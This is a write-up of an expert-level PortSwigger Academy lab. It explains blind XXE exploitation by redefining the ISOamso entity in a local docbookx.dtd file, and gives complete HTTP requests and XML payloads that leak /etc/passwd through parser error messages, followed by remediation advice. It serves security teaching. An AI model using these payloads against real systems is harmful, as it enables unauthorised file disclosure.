# XXE Injection: Exploiting XXE to Retrieve Data by Repurposing a Local DTD

## Platform
PortSwigger Web Security Academy

## Difficulty
Expert

## Vulnerability Category
Blind XML External Entity Injection, Local DTD Repurposing (CWE-611)

## Lab Objective
The "Check stock" feature parses XML input but never displays the result, and — unlike the prior error-based lab — this time the application **blocks outbound network interactions entirely**. Trigger a parsing error containing the full contents of `/etc/passwd` without hosting any external DTD, by referencing and redefining an entity inside a DTD that already exists on the server's own filesystem.

## Vulnerability Overview
Every prior exploitation technique in this series eventually depended on reaching something outside the target server: a Collaborator callback, or an attacker-hosted malicious DTD. This lab removes both options — out-of-band interactions are blocked, and there is no way to fetch an external resource from an attacker-controlled host. At first glance, this looks like it closes off blind XXE entirely. It doesn't, because of a lesser-known XML specification detail: **an internal DTD subset is permitted to redefine a parameter entity that an external DTD later declares, and the internal definition always wins.**

Many Linux distributions ship with standard system DTD files used by locally-installed documentation tooling. Systems running the GNOME desktop environment, for example, commonly include one at:

```
/usr/share/yelp/dtd/docbookx.dtd
```

This file declares numerous parameter entities for typesetting symbols — one of them is `ISOamso`. Since the attacker already knows the entity's name and that it will be declared by this file, they can **pre-emptively redefine `ISOamso`** with their own malicious chain, before the server ever loads the real file. When the vulnerable parser processes the local DTD and reaches its own `ISOamso` declaration, XML's override rule means the attacker's definition is already in place and takes precedence — effectively hijacking a legitimate system file's declared entity, with zero external network dependency.

## Methodology
1. **Rule out previous techniques.** Confirm out-of-band interactions are blocked (no Collaborator hits) and that hosting an external DTD is not viable for this lab, forcing a filesystem-local approach.
2. **Enumerate for a known local DTD file.** Test common, well-documented system DTD paths one at a time via a `SYSTEM` reference, distinguishing "file exists but DTD content is benign" (no error) from "file not found" (an explicit error) responses.
3. **Confirm `docbookx.dtd` is present**, then review its publicly documented contents (or reference a known-good payload) to identify a redefinable parameter entity such as `ISOamso`.
4. **Construct a payload that defines the attacker's version of `ISOamso` first**, inside the document's own internal DTD subset, before referencing the external local DTD.
5. **Chain the error-based exfiltration technique** (nested entities, numeric character references) inside the redefinition, exactly as in the previous error-message lab — but now triggered entirely through the hijacked local entity rather than a hosted external DTD.

---

## Exploitation

**Step 1:** Intercept the stock-check request in Burp Suite and send it to **Repeater**:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Step 2:** Probe for the presence of a known system DTD using a simple parameter-entity reference:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

A "file not found"-style error would indicate the file doesn't exist on this system; a normal (or differently-behaving) response confirms the file is present and was successfully parsed.

**Step 3:** With the file's presence confirmed, construct the full payload. This defines the attacker's own version of `ISOamso` *before* the local DTD is loaded — nesting the same error-triggering entity chain used in the previous lab inside it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Step 4:** Walking through what each piece does:
- `% local_dtd` references the real system file — this must be declared, but its own `ISOamso` definition will never actually take effect.
- `% ISOamso` is declared *before* `%local_dtd;` is referenced, with a value matching the exact chain used in the error-message lab: read `/etc/passwd` into `%file`, then dynamically build a second entity, `%error`, whose `SYSTEM` path is `/nonexistent/` concatenated with the resolved file contents.
- The `&#x25;` and `&#x26;#x25;` numeric character references are required at increasing levels of encoding, since this entity value is itself nested inside another entity's redefinition — each layer of nesting requires one additional level of escaping to prevent the parser from evaluating the `%` prematurely at the wrong stage.
- `%local_dtd;` is referenced last. The parser loads the real `docbookx.dtd`, reaches its own declaration of `ISOamso`, finds it already defined by the internal subset, and — per the XML specification's override rule — uses the attacker's version instead, executing the nested error-chain at that point.

**Step 5:** Send the request. The parser attempts to resolve `%error;`, which tries to load the now-malformed path `file:///nonexistent/<contents-of-/etc/passwd>` — a path that doesn't exist. The resulting parsing error includes the invalid path in its message, embedding the full contents of `/etc/passwd` directly in the HTTP response:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Step 6:** The leaked file contents confirm successful exploitation and solve the lab.

**Why it works:** The vulnerability is the same external-entity-resolution flaw present throughout this entire series. What makes this lab Expert-level is the technique required to reach it: with no network egress and no attacker-hosted DTD available, the only remaining avenue is a DTD that's already local to the target. XML's specification-mandated override behavior — an internal subset's entity definition always takes precedence over an external DTD's later declaration of the same name — becomes an exploitation primitive once the attacker knows both that a specific system DTD exists and the name of an entity it declares. The entire error-based exfiltration chain from the previous lab then runs exactly as before, just triggered via a hijacked local declaration instead of a remotely hosted one.

## Impact
- **Full data exfiltration with zero external dependencies** — this technique succeeds even in tightly egress-filtered environments where neither OOB network interaction nor external DTD hosting is possible, representing close to a worst-case scenario for defenders relying solely on network-layer controls.
- **Demonstrates that "no outbound internet access" is not a sufficient XXE mitigation on its own** — a server with zero ability to reach the internet is still fully exploitable for arbitrary local file disclosure as long as the underlying parser configuration remains vulnerable.
- **Relies on detailed, platform-specific reconnaissance** — the attacker needed to know the target likely runs a GNOME-based Linux distribution and the exact path/entity name within a specific bundled DTD, underscoring how OS and environment fingerprinting feeds directly into advanced exploitation.
- **Represents the most advanced technique in the XXE learning path**, combining local file enumeration, DTD override semantics, and multi-level entity encoding — real-world equivalents require this same depth of understanding when simpler exfiltration channels are unavailable.

## Remediation
- **Disable DTD processing and external entity resolution at the parser configuration level.** As with every lab in this series, this single fix closes every variant covered here — local DTD repurposing included — since none of it is possible if the parser refuses to process a `DOCTYPE` at all.
- **Do not treat network egress filtering as a standalone XXE mitigation.** This lab exists specifically to demonstrate that blocking outbound connections does not prevent local-file-based exfiltration techniques; the fix must live at the parser layer, not the network layer.
- **Suppress verbose parser error messages in production environments.** Independent of the external entity fix, returning raw parsing exceptions to the client would still leak data even if some other variant of this technique were found.
- **Minimize installed system packages and DTD files on production application servers** where feasible — reducing the pool of "known local resources" an attacker could potentially repurpose is a defense-in-depth measure, though not a substitute for disabling the underlying feature.

## Key Takeaways
- Blocking external network access is a meaningfully weaker defense than many assume — local filesystem resources can substitute for attacker-hosted infrastructure whenever a suitable, predictable local DTD exists.
- XML's internal-subset-overrides-external-DTD rule is an obscure but well-defined part of the specification, and understanding specification-level behavior (not just common payloads) is what separates Expert-tier exploitation from simply reusing known templates.
- Recognizing common OS/environment fingerprints (GNOME's `docbookx.dtd`, in this case) is a legitimate and often necessary step in advanced exploitation — general payload knowledge alone isn't sufficient without environment-specific reconnaissance.
- This lab is the capstone of the entire XXE learning path specifically because it forces every earlier technique (entity nesting, numeric character encoding, error-based exfiltration) to be combined and adapted to a constrained, network-isolated scenario — a strong indicator of genuine mastery versus payload memorization if you can explain each layer unprompted.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.